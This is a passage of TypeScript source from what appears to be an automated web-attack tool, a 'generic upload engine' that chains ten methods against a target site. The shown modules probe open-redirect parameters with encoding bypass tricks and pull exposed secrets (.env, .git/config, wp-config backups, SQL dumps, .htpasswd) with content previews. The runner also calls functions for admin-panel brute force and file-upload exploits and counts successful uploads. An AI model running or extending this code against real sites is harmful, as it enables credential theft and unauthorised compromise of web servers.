// ═══════════════════════════════════════════════════════

async function openRedirectSsrf(config: GenericUploadConfig): Promise<GenericUploadResult> {
  const base = getTargetBase(config);
  const domain = new URL(config.targetUrl).hostname;
  const redirectTarget = config.redirectUrl || "https://example.com";
  config.onProgress?.("open_redirect", "🔍 Testing open redirect & SSRF vectors...");

  try {
    const redirectTests = [
      // Common redirect parameters
      `${base}/redirect?url=${encodeURIComponent(redirectTarget)}`,
      `${base}/redirect?to=${encodeURIComponent(redirectTarget)}`,
      `${base}/goto?url=${encodeURIComponent(redirectTarget)}`,
      `${base}/out?url=${encodeURIComponent(redirectTarget)}`,
      `${base}/link?url=${encodeURIComponent(redirectTarget)}`,
      `${base}/away?to=${encodeURIComponent(redirectTarget)}`,
      `${base}/external?link=${encodeURIComponent(redirectTarget)}`,
      `${base}/click?url=${encodeURIComponent(redirectTarget)}`,
      // Login redirect abuse
      `${base}/login?next=${encodeURIComponent(redirectTarget)}`,
      `${base}/login?redirect=${encodeURIComponent(redirectTarget)}`,
      `${base}/login?return_to=${encodeURIComponent(redirectTarget)}`,
      `${base}/auth/callback?redirect_uri=${encodeURIComponent(redirectTarget)}`,
      // Double encoding
      `${base}/redirect?url=${encodeURIComponent(encodeURIComponent(redirectTarget))}`,
      // Protocol-relative
      `${base}/redirect?url=//${new URL(redirectTarget).host}`,
      // Backslash trick
      `${base}/redirect?url=${redirectTarget.replace("://", ":/\\")}`,
    ];

    for (const testUrl of redirectTests) {
      try {
        const { response } = await safeFetch(testUrl, {
          timeout: 6000,
          redirect: "manual",
          headers: { "Host": domain },
        });

        const location = response.headers.get("location") || "";
        
        if (response.status >= 300 && response.status < 400 && location.includes(new URL(redirectTarget).host)) {
          return {
            success: true, method: "open_redirect", technique: "Open redirect",
            url: testUrl, uploadedUrl: testUrl,
            details: `Open redirect found — redirects to ${location}`,
            severity: "high",
            evidence: `${response.status} → ${location}`,
            timestamp: Date.now(),
          };
        }
      } catch { /* continue */ }
    }

    return {
      success: false, method: "open_redirect", technique: "Open redirect testing",
      url: base, details: "No open redirect vectors found",
      severity: "info", timestamp: Date.now(),
    };
  } catch (e: any) {
    return {
      success: false, method: "open_redirect", technique: "Open redirect testing",
      url: base, details: `Error: ${e.message}`,
      severity: "info", timestamp: Date.now(),
    };
  }
}

// ═══════════════════════════════════════════════════════
//  10. Git/Config Leak → Credential Extraction → Upload
// ═══════════════════════════════════════════════════════

async function configLeakExploit(config: GenericUploadConfig): Promise<GenericUploadResult> {
  const base = getTargetBase(config);
  const domain = new URL(config.targetUrl).hostname;
  config.onProgress?.("config_leak", "🔍 Scanning for configuration leaks & sensitive files...");

  try {
    const sensitiveFiles = [
      // Version control
      { path: "/.git/config", type: "git" },
      { path: "/.git/HEAD", type: "git" },
      { path: "/.svn/entries", type: "svn" },
      { path: "/.svn/wc.db", type: "svn" },
      // Environment files
      { path: "/.env", type: "env" },
      { path: "/.env.backup", type: "env" },
      { path: "/.env.production", type: "env" },
      { path: "/config.php.bak", type: "config" },
      { path: "/wp-config.php.bak", type: "config" },
      { path: "/wp-config.php~", type: "config" },
      { path: "/configuration.php.bak", type: "config" },
      // Backup files
      { path: "/backup.sql", type: "database" },
      { path: "/dump.sql", type: "database" },
      { path: "/db.sql", type: "database" },
      { path: "/database.sql", type: "database" },
      { path: "/backup.zip", type: "archive" },
      { path: "/backup.tar.gz", type: "archive" },
      { path: "/site.zip", type: "archive" },
      // Debug/info files
      { path: "/phpinfo.php", type: "info" },
      { path: "/info.php", type: "info" },
      { path: "/test.php", type: "info" },
      { path: "/debug.php", type: "info" },
      // Server config
      { path: "/server-status", type: "server" },
      { path: "/server-info", type: "server" },
      { path: "/.htpasswd", type: "auth" },
      { path: "/web.config", type: "config" },
    ];

    const findings: { path: string; type: string; evidence: string }[] = [];

    for (const file of sensitiveFiles) {
      try {
        const { response } = await safeFetch(`${base}${file.path}`, {
          headers: { "Host": domain },
          timeout: 5000,
        });

        if (response.status === 200) {
          const body = await response.text().catch(() => "");
          const contentType = response.headers.get("content-type") || "";

          // Validate it's actually sensitive content (not a custom 404 page)
          let isSensitive = false;
          if (file.type === "git" && (body.includes("[core]") || body.includes("ref: refs/"))) isSensitive = true;
          if (file.type === "svn" && (body.includes("svn:") || body.includes("dir\n"))) isSensitive = true;
          if (file.type === "env" && (body.includes("DB_") || body.includes("APP_KEY") || body.includes("SECRET"))) isSensitive = true;
          if (file.type === "config" && (body.includes("password") || body.includes("db_host") || body.includes("$table_prefix"))) isSensitive = true;
          if (file.type === "database" && (body.includes("CREATE TABLE") || body.includes("INSERT INTO"))) isSensitive = true;
          if (file.type === "info" && body.includes("phpinfo()")) isSensitive = true;
          if (file.type === "server" && (body.includes("Server Version") || body.includes("Apache"))) isSensitive = true;
          if (file.type === "auth" && body.includes(":$")) isSensitive = true;
          if (file.type === "archive" && contentType.includes("zip")) isSensitive = true;

          if (isSensitive) {
            findings.push({
              path: file.path,
              type: file.type,
              evidence: body.slice(0, 200),
            });
          }
        }
      } catch { /* continue */ }
    }

    if (findings.length > 0) {
      const criticalTypes = ["env", "config", "database", "auth", "git"];
      const hasCritical = findings.some(f => criticalTypes.includes(f.type));

      return {
        success: true, method: "config_leak", technique: "Sensitive file exposure",
        url: base,
        details: `Found ${findings.length} sensitive files: ${findings.map(f => f.path).join(", ")}`,
        severity: hasCritical ? "critical" : "high",
        evidence: JSON.stringify(findings.map(f => ({ path: f.path, type: f.type, preview: f.evidence.slice(0, 100) }))),
        timestamp: Date.now(),
      };
    }

    return {
      success: false, method: "config_leak", technique: "Sensitive file scanning",
      url: base, details: "No sensitive files exposed",
      severity: "info", timestamp: Date.now(),
    };
  } catch (e: any) {
    return {
      success: false, method: "config_leak", technique: "Sensitive file scanning",
      url: base, details: `Error: ${e.message}`,
      severity: "info", timestamp: Date.now(),
    };
  }
}

// ═══════════════════════════════════════════════════════
//  MAIN: Run All Generic Upload Methods
// ═══════════════════════════════════════════════════════

export async function runGenericUploadEngine(config: GenericUploadConfig): Promise<GenericUploadReport> {
  const startTime = Date.now();
  const domain = new URL(config.targetUrl).hostname;
  const results: GenericUploadResult[] = [];

  console.log(`[GenericUpload] 🚀 Starting generic upload engine for ${domain}`);

  const methods = [
    { name: "WebDAV", fn: webdavUpload },
    { name: "HTTP PUT", fn: httpPutUpload },
    { name: "Form Upload", fn: formUploadExploit },
    { name: "REST API", fn: restApiUpload },
    { name: "S3 Bucket", fn: s3BucketExploit },
    { name: "File Manager", fn: fileManagerExploit },
    { name: "Admin Panel", fn: adminPanelBrute },
    { name: "Reverse Proxy", fn: reverseProxyExploit },
    { name: "Open Redirect", fn: openRedirectSsrf },
    { name: "Config Leak", fn: configLeakExploit },
  ];

  for (const method of methods) {
    try {
      config.onProgress?.(method.name.toLowerCase(), `🔄 Running ${method.name}...`);
      const result = await method.fn(config);
      results.push(result);

      if (result.success && result.uploadedUrl) {
        console.log(`[GenericUpload] ✅ ${method.name} SUCCESS: ${result.uploadedUrl}`);
        // Don't stop — collect all findings
      }
    } catch (e: any) {
      results.push({
        success: false, method: method.name.toLowerCase(), technique: method.name,
        url: config.targetUrl, details: `Error: ${e.message}`,
        severity: "info", timestamp: Date.now(),
      });
    }
  }

  const successfulUploads = results.filter(r => r.success && r.uploadedUrl).length;
  const duration = Date.now() - startTime;

  console.log(`[GenericUpload] 📊 Complete: ${successfulUploads} successful uploads, ${results.filter(r => r.success).length} total findings in ${duration}ms`);

  return {
    domain,
    totalMethods: methods.length,
    successfulUploads,
    results,
    duration,
  };
}

export {
  webdavUpload,
  httpPutUpload,
  formUploadExploit,
  restApiUpload,
  s3BucketExploit,
  fileManagerExploit,
  adminPanelBrute,
  reverseProxyExploit,
  openRedirectSsrf,
  configLeakExploit,
};
